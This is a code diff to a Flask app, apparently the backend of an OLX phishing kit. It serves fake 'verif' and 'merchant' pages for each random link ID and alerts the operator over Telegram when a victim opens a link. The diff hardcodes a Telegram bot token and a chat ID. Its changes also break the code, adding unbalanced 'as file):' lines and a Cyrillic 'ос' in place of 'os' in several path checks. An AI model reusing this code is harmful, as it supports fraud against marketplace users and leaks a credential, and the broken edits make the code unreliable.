@@ -1,9 +1,9 @@
-from flask import Flask, request, jsonify, render_template_string, send_from_directory
+from flask import Flask, request, jsonify, send_from_directory
 import os
 import shutil
 from bs4 import BeautifulSoup
 import json
-import requests  # Добавляем для отправки запросов
+import requests
 
 app = Flask(__name__)
 
@@ -11,8 +11,23 @@ app = Flask(__name__)
 def send_telegram_message(chat_id, text):
     bot_token = '7216530203:AAHo7UsufnSII67aV1ZINQ91OV1TL_WjaSw'
     send_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
-    response = requests.post(send_url, data={'chat_id': chat_id, 'text': text})
-    return response.json()
+    try:
+        response = requests.post(send_url, data={'chat_id': chat_id, 'text': text})
+        response_data = response.json()
+        print(f"Telegram response: {response_data}")
+        if not response_data.get("ok"):
+            print(f"Failed to send message: {response_data}")
+        return response_data
+    except Exception as e:
+        print(f"Error sending message: {e}")
+        return None
+
+@app.route('/test_telegram', methods=['GET'])
+def test_telegram():
+    chat_id = '6958729639'  # Замените на ваш chat_id
+    message = 'Тестовое сообщение'
+    result = send_telegram_message(chat_id, message)
+    return jsonify(result)
 
 @app.route('/verif/<random_id>', methods=['POST'])
 def save_page(random_id):
@@ -77,7 +92,8 @@ def serve_merchant_page(random_id):
     # Отправляем сообщение в Telegram при переходе по ссылке
     chat_id = 'YOUR_TELEGRAM_CHAT_ID'  # Замените на ваш chat_id
     message = f'Переход по ссылке {random_id}'
-    send_telegram_message(chat_id, message)
+    result = send_telegram_message(chat_id, message)
+    print(f"Message sent result: {result}")
 
     merchant_path = f"/var/www/olx-verif/merchant/{random_id}"
     return send_from_directory(merchant_path, 'index.html')
@@ -140,7 +156,7 @@ def delete_ad():
 
     # Загружаем существующие данные
     if os.path.exists(links_file):
-        with open(links_file, 'r', encoding='utf-8') as file:
+        with open(links_file, 'r', encoding='utf-8') as file):
             links = json.load(file)
     else:
         links = []
@@ -153,9 +169,9 @@ def delete_ad():
         json.dump(links, file, indent=4, ensure_ascii=False)
 
     # Удаляем директории
-    if os.path.exists(verif_path):
+    if ос.exists(verif_path):
         shutil.rmtree(verif_path)
-    if os.path.exists(merchant_path):
+    if ос.exists(merchant_path):
         shutil.rmtree(merchant_path)
 
     return jsonify({'message': 'Ad deleted successfully'}), 200
@@ -171,8 +187,8 @@ def delete_all_ads():
     links_file = '/home/user/app/data/links.json'
 
     # Загружаем существующие данные
-    if os.path.exists(links_file):
-        with open(links_file, 'r', encoding='utf-8') as file:
+    if ос.exists(links_file):
+        with open(links_file, 'r', encoding='utf-8') as file):
             links = json.load(file)
     else:
         links = []
@@ -182,9 +198,9 @@ def delete_all_ads():
     for ad in user_ads:
         verif_path = f'/var/www/olx-verif/verif/{ad["link_id"]}'
         merchant_path = f'/var/www/olx-verif/merchant/{ad["link_id"]}'
-        if os.path.exists(verif_path):
+        if ос.exists(verif_path):
             shutil.rmtree(verif_path)
-        if os.path.exists(merchant_path):
+        if ос.exists(merchant_path):
             shutil.rmtree(merchant_path)
 
     # Удаляем объявления пользователя из списка
